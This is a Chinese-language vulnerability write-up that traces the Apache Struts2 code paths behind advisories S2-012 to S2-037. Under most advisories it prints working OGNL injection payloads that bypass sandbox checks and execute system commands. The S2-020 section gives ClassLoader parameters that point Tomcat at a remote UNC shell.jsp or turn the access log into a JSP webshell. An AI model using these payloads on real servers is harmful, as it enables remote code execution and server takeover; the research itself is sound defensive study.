# 前言

书接上回，本篇记录 s2-012/s2-013/S2-014/s2-015/s2-016/s2-018/s2-019/s2-020/s2-021/s2-022/s2-026/s2-032/s2-033/s2-037 的调试过程。

# S2-012

漏洞触发原理与 S2-001 类似，对 `%{}` 表达式进行了循环解析。

> 影响版本：Struts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-012
> 描述：当配置重定向结果从 stack 中读取并使用之前注入的代码作为重定向参数时，将导致表达式的二次解析。

在 struts.xml 中配置成如下，
```
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
```

Struts2 使用 StrutsResultSupport 的子类 ServletRedirectResult 类处理 redirect 结果，`execute()` 方法调用 `conditionalParse()` 方法去解析 `this.location`，也就是我们配置的 `/index.jsp?name=${name}`，调用了 `TextParseUtil.translateVariables()` 方法去解析，后续的解析逻辑与 S2-001 一致，不再重复，导致了二次解析。

![img](https://oss.javasec.org/images/1625284296644.png)


此版本中构造 payload 别忘了调用静态方法时需要将 `_memberAccess` 的 allowStaticMethodAccess 设置为 true。最终的 payload 为：
```
%{#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open -a Calculator.app")}
```
或者：
```
%{new java.lang.ProcessBuilder(new java.lang.String[]{"open", "-a","Calculator.app"}).start()}
```

在看到第二种 payload 时，我人直接傻了，在之前的版本中为了绕过判断执行静态方法做了这么多尝试，却忘记了使用 ProcessBuilder 这种构造方法传递参数，然后调用 start 方法来执行命令。

这种情况就可以省略 `_memberAccess` 字段的修改，只需要修改 denyMethodExecution 即可，例如 S2-009 的 payload 就可以直接写为：

```
param=(#context["xwork.MethodAccessor.denyMethodExecution"]=false,new java.lang.ProcessBuilder(new java.lang.String[]{"open","-a","Calculator.app"}).start())(su18)&(param)(su19)
```

没想到啊没想到，妙啊妙啊。

# S2-013

S2-013 也是 Struts2 链接标签解析导致的漏洞。

> 影响版本：Struts 2.0.0 - Struts 2.3.14.1
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-013
> 描述：Struts2 链接标签转发请求参数时会对参数名和参数值进行解析，造成 OGNL 注入漏洞。

Struts2 中使用链接标签 `<s:a>` 和 `<s:url>` 来渲染链接，使用 url 标签可以引入一个静态路径或 action ，使用 a 标签可以直接渲染一个 a 链接。

在这两个标签中，存在一个属性 includeParams，有三个属性值：
- none：URL 中不包含参数。
- get：包含 URL 中的 GET 参数。
- all：包含 URL 中的 GET 和 POST 参数。

这个属性的作用是将请求当前页面的参数转发到标签中的链接中，例如 jsp 中使用 a 标签指向 action：
```html
<s:a id="link1" action="link" includeParams="all">"s:a" tag</s:a>
```
此时访问 jsp 文件所带的参数，就会被解析到渲染出来的 a 标签中，如下图：

![img](https://oss.javasec.org/images/1625284296646.png)

而就是这个解析的过程中，产生了漏洞。先跟一下处理逻辑：
- `ComponentTagSupport#doStartTag()` 方法开始解析标签，会调用对应的组件也就是 Anchor 的 start 方法。
- 接着调用 evaluateParams 以及 evaluateExtraParams 方法，在这个方法中，会依次调用 UrlRenderer 的 `beforeRenderUrl()` 和 `renderUrl()` 来渲染链接标签中的 URL。
- 实际上调用的是实现类 `org.apache.struts2.components.ServletUrlRenderer` 的方法，在 `beforeRenderUrl()`  中可以看到，includeParams 默认为 GET，根据其不同配置，将会进行不同的处理，最后会调用 `mergeRequestParameters()` 将 context 中的参数处理后缓存到一个 UrlProvider 对象中。

![img](https://oss.javasec.org/images/1625284296649.png)

- `beforeRenderUrl()` 处理完，将调用 `renderUrl()`，最后调用 `UrlHelper.buildUrl()` 方法构造 URL 。

而 S2-013 的漏洞点，就出在对 URL 的处理函数中，`buildUrl()` 方法调用 `buildParametersString()` 方法，又调用 `buildParameterSubstring()` 方法。

![img](https://oss.javasec.org/images/1625284296651.png)

其中一个重要的处理调用方法为 `translateAndDecode()` ，这个方法调用 `translateVariable()` 方法：

![img](https://oss.javasec.org/images/1625284296653.png)

而这个方法获取全局 ValueStack，并调用 `TextParseUtil.translateVariables()` 方法解析输入，这个方法我们很熟悉了，不再赘述。

![img](https://oss.javasec.org/images/1625284296655.png)

这样就暴露出了漏洞点：`translateAndDecode` 在`beforeRenderUrl` 时由 `parseQueryString` 方法调用一次，在  `renderUrl` 时又由 `buildUrl` 调用一次，导致调用了两次，所以对请求参数名和参数值都进行了二次解析，导致了 OGNL 注入。

漏洞触发需要参数 includeParams 设置为 get/all，在参数名和参数值中都可以触发，最终 payload 为：

```
%{#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open -a Calculator.app")}
```

与 S2-012 的 payload 一致。

# S2-014

而 S2-014 是对 S2-013 修复不足的绕过。

> 影响版本：Struts 2.0.0 - Struts 2.3.14.1
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-014
> 描述：官方文档描述 Struts 2.3.14.1 版本修复 S2-013 不完全，在S2-014 中为其进行了完全的修复。

根据网上技术文章的描述，在Struts 2.3.14.1 版本中对 `%{(exp)}` 格式的 OGNL 执行进行了限制，于是出现了 `${exp}` 格式的攻击方式。

这部分我直接使用 Struts 2.3.14.1 版本进行测试，发现也没有对 `%{(exp)}` 这种进行阻拦，花费了一天的时间看源码也没有发现对格式有校验的地方，期待与对这个点有研究的师傅们交流。

由于 `UrlHelper#translateVariable()` 方法调用的是只有两个参数的 `TextParseUtil.translateVariables()` 方法。

![img](https://oss.javasec.org/images/1625284296656.png)

这个方法指定 openChars 可以为 `$` `%`，所以可以除了使用 `%{}` ，也可以使用 `${}` 包裹表达式。因此 payload 为：

```
${#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec("open -a Calculator.app")}
```

# S2-015

Struts2 返回结果时，将用户可控的参数拿来解析，就会导致漏洞。

> 影响版本：Struts 2.0.0 - Struts 2.3.14.2
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-015
> 描述：S2-015 官方公告公布了两种漏洞利用方式，一种是通配符匹配 action ，一种是在 struts.xml 中使用 `${}` 引用 Action 变量导致的二次解析。

在使用 struts2 时，每一个action 都需要配置，每一个 action 里面的方法以及其返回到的界面都需要配置，如果一个一个配置，就太麻烦了，因此可以约定一些命名规范，然后在 struts.xml 里面使用通配符进行配置。

在 Struts2 中可以使用通配符 `*` 来匹配 action，并使用 `{1}` 来获取 `*` 的值，这有点像正则的匹配模式，如下配置：

```
<package name="S2-015" extends="struts-default">
    <action name="*" class="com.demo.action.PageAction">
        <result>/{1}.jsp</result>
    </action>
</package>
```

其中还可以使用多个 `*`  进行匹配，例如：`*_*`，这样就可以使用 `{1}` 和 `{2}` 来获取其中的值。

经过了以上配置后，我们再来跟一下访问流程：
- `StrutsPrepareAndExecuteFilter#doFilter` 方法预处理请求，调用 `PrepareOperations#findActionMapping` ，调用 `ActionMapper#getMapping` 方法处理请求 action。
  
![img](https://oss.javasec.org/images/1625284296658.png)

-  调用 `this.dropExtension` 将 `extensions` 中的扩展后缀也就是 action 剪掉，并将这 action 以键值对的方式储存在 ActionMapping 中，然后还会调用 `parseNameAndNamespace()` 、`handleSpecialParameters()` 、最后使用 `parseActionName()` 处理动态调用的情况
   
![img](https://oss.javasec.org/images/1625284296659.png)

- 处理中间调用流程，在我们的配置中，使用 * 匹配了全部的 action 地址，并返回 `{1}.jsp` ，这些信息放在了 ResultConfig 对象中，最后处理结果时将会进行解析和渲染：
  
![img](https://oss.javasec.org/images/1625284296661.png)

- DefaultActionInvocation 的 executeResult 方法 调用 StrutsResultSupport 的 `execute()` 方法 调用 `conditionalParse()` 最后调用 `TextParseUtil.translateVariables()` 方法解析这个地址。
  
![img](https://oss.javasec.org/images/1625284296664.png)


可以看到此漏洞最终触发点实际上与 S2-012 是一致的。

需要注意的是，在 Struts 2.3.14.2 中，官方将 SecurityMemberAccess 类中成员变量 allowStaticMethodAccess 添加了 final 修饰符，并且将其 set 方法进行了删除。这就导致了我们不能通过 `#_memberAccess["allowStaticMethodAccess"]=true` 来改变其值，因为没有 set 方法了。但是至少有两种思路进行绕过：
- 使用反射修改其值：`#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),`；
- 使用非静态方法调用 POC：`new java.lang.ProcessBuilder(new java.lang.String[]{"open", "-a","Calculator.app"}).start()`。

因此最终 payload 为：
```
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')}.action
```

当然此处使用 `%` 或 `$` 均可。

S2-015 中还通报了另一种导致漏洞的点，官方给出的漏洞范例如下：
```
<result type="httpheader">
    <param name="headers.foobar">${message}</param>
</result>
```
当用户输入参数被用来配置返回结果时，会遭到二次解析，这与上一个点的漏洞原理是相通的。

在处理返回结果时，处理响应包头部信息使用 HttpHeaderResult 类的 `execute()` 方法，取得`${message}` 的内容，然后调用 `TextParseUtil.translateVariables()` 进行解析。

![img](https://oss.javasec.org/images/1625284296666.png)

payload 与之前一致。

# S2-016

与 S2-012 触发点一致，但入口点不同的漏洞。

> 影响版本：Struts 2.0.0 - Struts 2.3.15
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-016
> 描述：Struts2 提供了在参数中使用 `redirect:`、`redirectAction:` 前缀指定应用程序重定向路径或 action 的功能，处理重定向结果时没有过滤直接使用 OGNL 解析道导致出现漏洞。

在 DefaultActionMapper 中，定义了一些 PREFIX 常量，用来标识一些不同的前缀：

![img](https://oss.javasec.org/images/1625284296670.png)

这个类中还存在一个成员属性 prefixTrie ，它是一个 PrefixTrie 对象，他用来将不同的前缀与不同的对象相匹配，这个属性会在 DefaultActionMapper 的无参构造方法中进行初始化。

![img](https://oss.javasec.org/images/1625284296672.png)

我们发现其将不同的前缀分别对应到了不同的 ParameterAction 类中，分别实现了不同的  `execute()` 方法：
- `method:`：将参数 key 字符串去掉前缀，并使用 ActionMapping 的 `setMethod()` 方法设置；
- `action:`：将参数 key 字符串去掉前缀，并在其中寻找 “!”，如果存在 “!”，则进行字符串分隔，前面是 method，后面是 name，分别使用 `setMethod()` 和 `setName()` 进行设置；
- `redirect:`：将参数 key 字符串去掉前缀，创建一个新的 ServletRedirectResult，将 key 使用 `setLocation()` 中，将 ServletRedirectResult 对象放在 ActionMapping 中；
- `redirectAction:`：与 `redirect:` 逻辑一致，只不过在其后面添加了 action 后缀。

在 S2-015 的漏洞分析中提到过， `StrutsPrepareAndExecuteFilter#doFilter` 方法会调用到`handleSpecialParameters()` 方法来处理一些特殊的参数值，其中就包括了以 ".x/.y" 结尾和存在特殊前缀的访问：

![img](https://oss.javasec.org/images/1625284296676.png)

使用 prefixTrie 的 `get()` 方法来匹配是否包含相关前缀，并调用保存在其中的类的 execute 方法，就是 DefaultActionMapper 中初始化的那些类的相关方法。

这个处理给 Struts2 提供了通过控制请求参数来修改应用程序调用逻辑的功能：
- method：指定调用某个方法
- action：指定调用某个 action 的某个方法
- redirect：指定应用程序重定向位置
- redirectAction：指定应用程序重定向的 action

而就是这个功能，导致了漏洞：对于 redirect 和 redirectAction 前缀，在处理时将会创建 ServletRedirectResult 类，并会将前缀后面的内容使用 `setLocation()` 设置到结果对象中，在处理结果时将会使用 `execute()` 方法调用 `conditionalParse()` 方法去解析 `this.location`，与 S2-012 漏洞触发点完全一致。

因此最终 payload 为：

```
redirect:%{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')}
```
或者：
```
redirectAction:%{new java.lang.ProcessBuilder(new java.lang.String[]{"open", "-a","Calculator.app"}).start()}
```

同样地，再次漏洞中使用 `%` 或 `$` 均可。

# S2-018/S2-019

两个在网上没什么分析的洞，但是影响应该也不小。

> 影响版本：Struts 2.0.0 - Struts 2.3.15.2、Struts 2.0.0 - Struts 2.3.15.1
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-018、https://cwiki.apache.org/confluence/display/WW/S2-019
> 描述：推测为 S2-016 漏洞的延续。

在 S2-018 中，官方描述漏洞影响为“Permissions, Privileges, and Access Controls”，漏洞评级为 “Important” ，因此应该是一个较高危害的漏洞，通过漏洞描述以及修复来看，这应该是针对 `action:` 前缀引发的漏洞，攻击者通过使用精心构造的`action:` 可以绕过访问控制限制。

在 S2-019 的官方通报中，描述漏洞影响为“Dynamic method executions”，修复方案将 struts2-core 包中的 default.properties 配置中的 `struts.enable.DynamicMethodInvocation`，在 Struts 2.3.15.2 之后，默认值被设置为 false，其他版本也可以在 `struts.xml` 中使用如下配置：
```
<constant name="struts.enable.DynamicMethodInvocation" value="false"/>
```

而这个参数从名字就可以看出来，这是动态方法调用的 flag，也就是对应着 `action:`  和 `method:`两个前缀。

由此可以推测，S2-018/S2-019 可能是对 S2-016 的延续，对 `action:`  和 `method:` 两种前缀挖掘出了恶意利用的方式，但还是存在一定的限制性。

对于 S2-018，我看到了官方的修复方案中，提到了关于 action 前缀的命名空间的修复，结合漏洞描述，我猜测可能与使用 `action:` 前缀跨命名空间调用相关，于是我简单写了这样一个 demo：
- 创建了 TestAction、Test2Action 两个 action，`execute()` 方法直接返回 success；
- 在 struts.xml 中为两个 action 配置不同的 namespace，如下图；
  ![img](https://oss.javasec.org/images/1625284296679.png)
- 两个 action 分别调用了不同的 jsp 显示不同的内容，TestAction->test.jsp->su18，Test2Action->test2.jsp->su17。

接下来我们尝试调用，正常访问没有问题：

![img](https://oss.javasec.org/images/1625284296682.png)

然后我们尝试在访问 test2.action 时使用 action 前缀调用 test.action 的 `execute()` 方法，应用程序报错：

![img](https://oss.javasec.org/images/1625284296684.png)

报错声明对于命名空间 `/su18` ，找不到名为 test 的 action，那我们直接访问路径为：http://localhost:8080/test2.action?action:test!execute，或者直接访问：http://localhost:8080/aaaaa.action?action:test!execute，发现可以访问到同一命名空间中的 test action。

![img](https://oss.javasec.org/images/1625284296686.png)

这种情况表面上访问了 aaaaa.action，实际上访问了 test.action，这就已经有点挂羊头卖狗肉的意思的了，但这种情况还没有跨出 namespace 。

那如何访问不同命名空间中的方法呢？这里偷懒直接看一下 diff：

![img](https://oss.javasec.org/images/1625284296688.png)

发现在更新后，对 `action:` 前缀后面的值处理了 "/"，并对包含 "/" 的值进行了截取。

# S2-020/S2-021/s2-022

官方接收了各个安全团队的报告后更新了它的正则。

> 影响版本：Struts 2.0.0 - Struts 2.3.16.1、Struts 2.0.0 - Struts 2.3.16.3
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-020、https://cwiki.apache.org/confluence/display/WW/S2-021、https://cwiki.apache.org/confluence/display/WW/S2-022
> 描述：对参数处理时的 class/ClassLoader 进行了限制。

S2-020 修复了一个 DOS ，我们不关注这个，略过。我们关心 class/ClassLoader 相关的漏洞。

这里我们使用 2.3.16.1 进行测试，我们看到，在 ParametersInterceptor 中，Struts2 对参数名校验的正则为：
```
\w+((\.\w+)|(\[\d+\])|(\(\d+\))|(\['\w+'\])|(\('\w+'\)))*
```

这样的正则，其实上还是可以在一定程度上修改 context 及 root 中的内容，例如：

![img](https://oss.javasec.org/images/1625284296692.png)

而且这个正则允许 `a.b.c.d.e` 的参数形式：

![img](https://oss.javasec.org/images/1625284296695.png)

这种形式能造成什么危害呢？

在 OGNL 中，可以直接使用变量名访问 root 对象中的内容，是因为程序会在 root 对象中尝试寻找对应的变量以及 get/set/is 方法：

![img](https://oss.javasec.org/images/1625284296697.png)

因此，我们可以直接使用 `class` 关键字获取 root 的 Class 对象，因为会调用 `getClass()` 方法，这个方法每个类都有，并可以通过这个方法访问其 ClassLoader 对象等等，如下图：

![img](https://oss.javasec.org/images/1625284296700.png)

在 struts2 中， root 对象是当次访问的 Action 对象，而其 ClassLoader 通常由运行环境所提供，例如在 Tomcat 下，这个 ClassLoader 应该为当前应用所使用的：`org.apache.catalina.loader.WebappClassLoader`。

在这个 ClassLoader 中，存放了很多在容器运行时，上下文中的所需要的一些值，如果这些值被修改了，可能会影响到应用程序的运行方式。

![img](https://oss.javasec.org/images/1625284296703.png)

能被我们修改的属性需要有以下几个条件：
- 有 set 方法，或者是可以使用 set 方法改变的值；
- 修饰符应该是 public；
- 属性的返回值应该是通过用户的输入可以被 OGNL 解析成为相应的对象；
- 修改后能够对应用程序造成影响，导致安全风险。


例如访问：`http://localhost:8080/test.action?class.classLoader.resources.dirContext.docBase=/Users/phoebe/Downloads`

此时 Tomcat 的文档路径将会改为我们传入的指定路径，可以访问其中的内容：

![img](https://oss.javasec.org/images/1625284296705.png)


在互联网上  yiran4827 师傅发出了他编写的脚本，用来找到 Tomcat 中可能存在风险的相关属性：

```java
<%!public void processClass(Object instance, javax.servlet.jsp.JspWriter out, java.util.HashSet set, String poc){
    try {
        Class<?> c = instance.getClass();
        set.add(instance);
        Method[] allMethods = c.getMethods();
        for (Method m : allMethods) {
        if (!m.getName().startsWith("set")) {
            continue;
        }
        if (!m.toGenericString().startsWith("public")) {
            continue;
        }
        Class<?>[] pType  = m.getParameterTypes();
        if(pType.length!=1) continue;
        
        if(pType[0].getName().equals("java.lang.String")||
        pType[0].getName().equals("boolean")||
        pType[0].getName().equals("int")){
            String fieldName = m.getName().substring(3,4).toLowerCase()+m.getName().substring(4);
            out.print(poc+"."+fieldName + "<br>");
        }
        }
        for (Method m : allMethods) {
        if (!m.getName().startsWith("get")) {
            continue;
        }
        if (!m.toGenericString().startsWith("public")) {
            continue;
        }       
        Class<?>[] pType  = m.getParameterTypes();
        if(pType.length!=0) continue;
        if(m.getReturnType() == Void.TYPE) continue;
        Object o = m.invoke(instance);
        if(o!=null)
        {
            if(set.contains(o)) continue;
            processClass(o,out, set, poc+"."+m.getName().substring(3,4).toLowerCase()+m.getName().substring(4));    
        } 
        }
    } catch (java.io.IOException x) {
        x.printStackTrace();
    } catch (java.lang.IllegalAccessException x) {
        x.printStackTrace();
    } catch (java.lang.reflect.InvocationTargetException x) {
        x.printStackTrace();
    }   
}%>
```

由于根据环境不同，`class.classLoader` 对应的结果是不同的，因此这个漏洞的利用不是特别的具有通用性，在此篇文章中，也只针对 Tomcat 进行研究和测试。

利用这个方式，目前在互联网上出现了一些 Tomcat 或其他中间件的 RCE 的利用方式：

1. Tomcat 应用目录更改为恶意 UNC 路径：
```
class.classLoader.resources.dirContext.docBase=\\192.168.1.1\shell.jsp
```

2. 修改日志记录文件位置、文件名、文件后缀，通过访问时带入恶意 jsp 代码，将日志文件后缀修改为 jsp，这样访问时程序会以 jsp 代码进行解析，执行恶意文件。
```
class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
<%Runtime.getRuntime().exec("calc");%>
```

S2-020 的修复在 excludeParams 的正则中添加了 `^class\..*`，这种形式，可以轻易使用如下方式绕过：

```
class['classLoader'].resources.dirContext.docBase=
top.class.classLoader.resources.dirContext.docBase=
Class.classLoader.resources.dirContext.docBase=
```

于是 S2-021 的修复又添加了对 classloader 字符的拦截。

而 S2-022 与之前是相同的漏洞，只不过由触发点由 ParametersInterceptor  变为了 CookieInterceptor。不再赘述。

# S2-026

Struts2 官方继续维护它的正则。

> 影响版本：Struts 2.0.0 - Struts Struts 2.3.24
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-026
> 描述：对 top 在参数访问时进行限制。

在  S2-009 的分析中，我们使用了 `top['foo'](0)` 的形式用来对 foo 进行二次 OGNL 解析，这实际上是使用了 top 可以访问 root 中的第一个对象的特性，在 S2-026 的通告中，官方禁止了通过参数名使用 top 访问上下文中的内容。

这就解决了我们在 S2-020 分析中提到的问题。同时官方提供了一个新正则，用来在其他版本中缓解这个漏洞情况：

```
"(^|\\%\\{)((#?)(top(\\.|\\['|\\[\")|\\[\\d\\]\\.)?)(dojo|struts|session|request|response|application|servlet(Request|Response|Context)|parameters|context|_memberAccess)(\\.|\\[).*",
"^(action|method):.*"
```

# S2-032

本漏洞可以理解为 S2-016 漏洞的延续，对于特殊的访问前缀，除了 redirect\redirectAction 外，这次我们将注意力放到了 method 上。

> 影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-032
> 描述：在 DMI 开启时，使用 method 前缀可以导致任意代码执行漏洞。

针对此漏洞，我们使用 2.3.24 版本进行调试，依旧是在 DefaultActionMapper 中，将 4 个前缀对应的处理方法初始化在了 prefixTrie 中。

![img](https://oss.javasec.org/images/1625284296708.png)

在收到请求时，由 `StrutsPrepareAndExecuteFilter#doFilter` 方法处理并执行到 action，这部分由 ActionInvocation 的实现类 DefaultActionInvocation 进行实现调度，在这之间会调用Dispatcher 的 `serviceAction()` 方法创建 ActionProxy 代理对象，并将相关的信息存储在这个代理对象中。

需要注意的是，会对 methodName 进行处理，包括 `StringEscapeUtils.escapeHtml4()` 以及 `StringEscapeUtils.escapeEcmaScript()` 方法，对一些特殊字符进行转义。

![img](https://oss.javasec.org/images/1625284296710.png)

在 `DefaultActionInvocation#invokeAction`  方法中，会将 proxy 中的方法名拿出来，在后面拼接 `()` 并调用 `OgnlUtil.getValue()` 方法以 action 对象为 root 进行解析。

![img](https://oss.javasec.org/images/1625284296713.png)

这就是最终的漏洞触发点，这部分流程其实我们比较好理解，但是关键点在于如何构造 payload 绕过当前的一些限制。

首先，在使用 method 前缀时，会判断 DMI（动态方法调用）是否开启，这部分在 S2-019 的修复中将其配置在了配置文件中的 `struts.enable.DynamicMethodInvocation` ，并默认为 false，这部分没有办法进行绕过，因此 S2-032 的漏洞利用条件需要开启 DMI。

其次，在调用方法时会有相关的判断，系统内置了对调用类包名的正则、对类名的黑名单的校验，如下图：

![img](https://oss.javasec.org/images/1625284296718.png)

我们需要绕过这些 payload，可以将 excludedClasses 以及 excludedPackageNamePatterns 这两个 SET 设置为空，因此最终的 payload 为：

```
method:#_memberAccess.excludedClasses=@java.util.Collections@EMPTY_SET,#_memberAccess.excludedPackageNamePatterns=@java.util.Collections@EMPTY_SET,new java.lang.ProcessBuilder(new java.lang.String[]{message,message2,message3}).start&message=open&message2=-a&message3=Calculator.app
```

需要注意的是，由于对 method 的名称，由于会经过处理，将单、双引号转义处理，处理后 OGNL 将无法正常解析，因此如上 payload 其实是使用 ProcessBuilder，需要使用三个 action 自带的参数来写入 String 类型的参数。

这里还是使用了 `new ProcessBuilder()` 的方式，如果想使用 Runtime 或其他静态方法调用，依旧是要将 allowStaticMethodAccess 修改为 true，在 S2-016 中，因为 set 方法被删除，我们通过反射来修改 allowStaticMethodAccess 的值，但是在 2.3.20 版本以后，SecurityMemberAccess 引入了一个新的判断方法 `isClassExcluded()`，用来对之前提到的类的黑名单进行校验：

![img](https://oss.javasec.org/images/1625284296720.png)

在这个方法中直接判断了执行的方法的类不能是 `Object.class`，因此，我们就不能通过 `getClass()` 方法获得一个类的 class 对象。

获取一个类的 Class 对象有三种方式：
- `a.getClass()`：实际上是 Object 对象的 native 方法 `getClass()`；
- `a.class`：这种写法在 OGNL 中解析，还是会调用 `getClass` 方法；
- `Class.forName('a')`：这种方法本身就是静态方法调用。

三种获取 class 对象的方法都不能用，因此我们无法通过 set 方法和反射来修改 SecurityMemberAccess 中 allowStaticMethodAccess 的值，那该如何执行静态方法呢？

在 `ognl.OgnlContext` 中，有一个 public static 的 MemberAccess 对象，实际上是 DefaultMemberAccess 对象。我们直接将 `_memberAccess` 对象引用至此对象，就绕过了 SecurityMemberAccess 对象里 `isAccessible()` 方法冗长的判断，直接执行静态代码了。

![img](https://oss.javasec.org/images/1625284296723.png)


这就是网上流传的 S2-032 的 payload 所使用的方式，所以最终 payload 为：
```
method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(param).toString&param=open -a Calculator.app
```

这里有两个点需要注意的是：
- 由于程序会在 methodName 后拼接 “()”，再进行表达式的解析，所以需要想办法结合这个括号，我们使用的方法是用 toString 来闭合；
- 由于转义了部分符号，所以在 payload 中不能使用单双引号，可以结合请求参数中的值进行获取。

在 OGNL 表达式中，还有一种方式那就是 `@a@class` 的方式，这种方式不同于 `getClass()` 的方法调用方式，将由 ClassResolver 的实现类获取类的 Class 对象，具体实现是 `Class.forName('a')` 或者是使用当前线程的 ClassLoader 去 loadClass。

![img](https://oss.javasec.org/images/1625284296725.png)

这种使用方式将在 S2-045 中进行使用，此处不进行扩展。

# S2-033

与 S2-032 漏洞逻辑相同，由于动态方法调用时对 methodName 没有进行处理，导致了漏洞。

> 影响版本：Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-033
> 描述：在使用 REST 插件，并启用动态方法调用时，可导致 RCE。

使用 REST 插件，会使用 RESTFUL 风格处理 URL 请求，将 URL 请求按照不同的形式进行映射。

这里使用官方的 struts2-rest-showcase 进行调试，使用的依赖包为 struts2-rest-plugin-2.3.24.1.jar ，在这个包中配置了一个 struts-plugin.xml，将会由 Struts2 进行加载。

![img](https://oss.javasec.org/images/1625284296727.png)

在这个配置中，我们看到一些中间处理类和常量被替换了，其中我们比较关注的是：ActionMapper -> RestActionMapper。

在 S2-032 中，ActionMapper 实现类 DefaultActionMapper 中没有对动态方法执行中的方法名称进行过滤和处理， 在 `DefaultActionInvocation#invokeAction` 方法中对其进行了解析，导致了 RCE 的出现。

在 RestActionMapper 中，与 DefaultActionMapper 处理方法类似，去后缀，解析 url，处理特殊的请求参数，这代码基本是粘过来的。

![img](https://oss.javasec.org/images/1625284296730.png)

但是有一个区别是，DefaultActionMapper 用来处理 action 请求，系统配置的默认扩展名是 action，RestActionMapper 用来处理 REST 请求，系统配置的 action 扩展名是 xhtml、xml、json，默认扩展是 xhtml。也就是说，在使用了 REST 插件后，访问以上扩展名的连接，会以 action 来进行解析。

![img](https://oss.javasec.org/images/1625284296734.png)

RestActionMapper 同样提供了动态方法调用的功能，可以使用 "!" 调用其他的方法，在handleDynamicMethodInvocation 方法中处理并存入 ActionMapping 中。

![img](https://oss.javasec.org/images/1625284296736.png)

虽然在 DefaultActionMapper 中也提供此项功能，但是其中使用了 allowedActionNames 正则，在解析 url 时使用的方法 `parseNameAndNamespace()` 对 actionName 进行了过滤和清除，正则为：`[a-zA-Z0-9._!/\-]*`

但是在 RestActionMapper 中不会对 action 名进行过滤和处理，因此导致了 RCE 漏洞。

在后续的处理中，虽然是使用 Rest 插件提供的一些子类，例如 DefaultActionProxyFactory 的子类 RestActionProxyFactory，DefaultActionInvocation 的子类 RestActionInvocation，但最终的调用是一致的，在处理 action 时依旧由父类方法 `DefaultActionInvocation#invokeAction` 进行处理，触发漏洞。

由于漏洞位置的特殊性，部分特殊字符依旧不能使用，因此还是需要参数进行配合，因此 payload 为：

```
!#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.param[0]).toString.json?param=open -a Calculator.app
```

成功弹出计算器：

![img](https://oss.javasec.org/images/1625284296738.png)


# S2-037

REST 形式访问时，对解析的 methodName 没有过滤导致了漏洞。

> 影响版本：Struts 2.3.20 - Struts Struts 2.3.28.1
> 参考链接：https://cwiki.apache.org/confluence/display/WW/S2-037
> 描述：在使用 REST 插件时，可导致 RCE。

这个漏洞的官方描述没有提到是否需要开启 DMI，那就是与 S2-033 不同的漏洞触发点。

在 `RestActionMapper#getMapping` 提供了一个功能，代码如下：

![img](https://oss.javasec.org/images/1625284296741.png)

这段代码实际上实现了一个功能：对于 `actionName/id/methodName` 形式的访问参数，会分别截取进行赋值，其中的第二个 "/" 后面的内容就会作为 methodName 进行处理，并放入 ActionMapping 中。

这就是 S2-037 的漏洞点，后续调用逻辑与 S2-033   相同，payload 也相同，不重复粘贴了。
